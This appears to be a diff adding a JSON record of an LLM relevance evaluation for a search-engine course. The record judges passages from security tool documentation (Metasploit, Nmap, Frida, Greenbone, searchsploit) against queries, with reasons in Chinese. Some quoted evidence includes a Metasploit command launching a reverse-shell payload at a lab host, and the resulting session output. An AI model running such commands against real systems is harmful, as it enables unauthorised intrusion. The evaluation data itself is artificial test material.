@@ -1,0 +1,146 @@
+{
+  "review_origin": "llm",
+  "evaluator": "Codex CLI default model; exact identifier not exposed by JSON events",
+  "input_sha256": "7c176af51c6d0966a7fa77d48d63bb5e975564959fa3b99c46e4f3f917561290",
+  "policy_sha256": "4a41becbce596ebfef0fdbcce2b81c4daba130fb45140ba4a45a816a52a4a7f4",
+  "prompt_sha256": "bf172124e5f96beae1df797f55272c24a64c35fae116ab87ec6da3dda0eda565",
+  "schema_sha256": "c3529c3a315af2a5be1c5bf46f4242811582a43c226d92111f17fd4ca92911e5",
+  "raw_events_sha256": "bba1e9e5d4cc001ef3518ff1fcac462ff19cf342ad3c22dba7db722888feefe3",
+  "started_at": 1793848676.238871,
+  "finished_at": 1793848702.49799,
+  "command": [
+    "codex",
+    "exec",
+    "--ephemeral",
+    "--ignore-user-config",
+    "--skip-git-repo-check",
+    "--sandbox",
+    "read-only",
+    "--cd",
+    "/tmp",
+    "--json",
+    "--color",
+    "never",
+    "--output-schema",
+    "/Users/gavin/Documents/ChatGPT/資料檢索/work/search-engine-course-upgrade/data/evaluation/v8.2-llm/schema.json",
+    "--disable",
+    "shell_tool",
+    "--disable",
+    "apps",
+    "--disable",
+    "plugins",
+    "--disable",
+    "multi_agent",
+    "--disable",
+    "browser_use",
+    "--disable",
+    "computer_use",
+    "--disable",
+    "memories",
+    "--disable",
+    "chronicle",
+    "-"
+  ],
+  "result": {
+    "decisions": [
+      {
+        "decision_id": "450681121ff6f67198f8-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "內容介紹動態插樁與文件規劃，未說明 APK 資源解碼或擷取。",
+        "evidence": "It attaches to running software and gives you access to the execution flow and data."
+      },
+      {
+        "decision_id": "63e85d98ee4514430972-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "僅提及向 APK 注入 Gadget，未提供封裝資源的檢視、擷取或解碼資訊。",
+        "evidence": "Android: how to inject the Gadget in the APK, how to get the APK from the phone in the first place."
+      },
+      {
+        "decision_id": "2233ecb6bb6cec3bb66d-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "說明漏洞利用模組的選用、必要參數及執行方式。",
+        "evidence": "The run command will run the module against the target, there is also an aliased exploit command which will perform the same action:"
+      },
+      {
+        "decision_id": "c7a193f826b22896ce9a-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "提供選取模組、設定目標與酬載並執行的使用者流程。",
+        "evidence": "run rhost=192.168.123.133 lhost=192.168.123.1 payload=cmd/unix/reverse"
+      },
+      {
+        "decision_id": "def1a2991b2cfcfe23e5-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "展示漏洞利用後建立 shell，未說明既有 session 的列出、切換或管理。",
+        "evidence": "Command shell session 2 opened (192.168.123.1:4444 -> 192.168.123.133:48578)"
+      },
+      {
+        "decision_id": "a59da2ec595c997dcd53-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "僅介紹停止與重新啟動擷取，未說明儲存封包或輸出 pcap。",
+        "evidence": "A running capture session can be restarted with the same capture options as the last time, this will remove all packets previously captured."
+      },
+      {
+        "decision_id": "c7f65579af34f25a4d1f-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "說明私人模組的安裝、重新載入、選取及執行。",
+        "evidence": "msf > use exploit/test/test_module"
+      },
+      {
+        "decision_id": "d33c565f8f05844528e8-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "提供下載模組、載入主控台、選取及執行的完整操作示例。",
+        "evidence": "msf exploit ( test_module ) > exploit [*] Started reverse handler on 192.168.145.1:4444 [+] Hello, world!"
+      },
+      {
+        "decision_id": "238b371c3f9e2928596b-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "介紹 IP 協定編號對照檔，未解釋 UDP 連接埠掃描。",
+        "evidence": "This file maps the one-byte IP protocol number in the IP header into the corresponding protocol name."
+      },
+      {
+        "decision_id": "0d611eae57c94fdd4205-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "解釋透過探測請求與回應比對辨識網路服務。",
+        "evidence": "Proper identification requires sending two probes and comparing the two responses—an ideal task for NSE."
+      },
+      {
+        "decision_id": "64801ca1dd56efcb8c43-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "說明 Nmap 版本偵測及以 -sV 啟用 NSE 版本腳本。",
+        "evidence": "Scripts in this category are run whenever you request version detection with -sV ; you don't need to use -sC to run these."
+      },
+      {
+        "decision_id": "8d186c832219e207ded0-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "內容為服務版本辨識，未介紹主機作業系統指紋或偵測。",
+        "evidence": "NSE's version category contains scripts that enhance standard version detection."
+      },
+      {
+        "decision_id": "38a851ec11467f9b0e5d-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "描述一般遠端系統漏洞稽核，未明確記載 Web 應用程式漏洞掃描能力。",
+        "evidence": "The Greenbone Vulnerability Manager is a modular security auditing tool, used for testing remote systems for vulnerabilities that should be fixed."
+      },
+      {
+        "decision_id": "c26c29af0d0ed7b427ef-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "提供漏洞資料庫搜尋工具；SQL 注入僅出現在搜尋結果，並無自動偵測能力說明。",
+        "evidence": "searchsploit Exploit Database Archive Search"
+      }
+    ]
+  }
+}
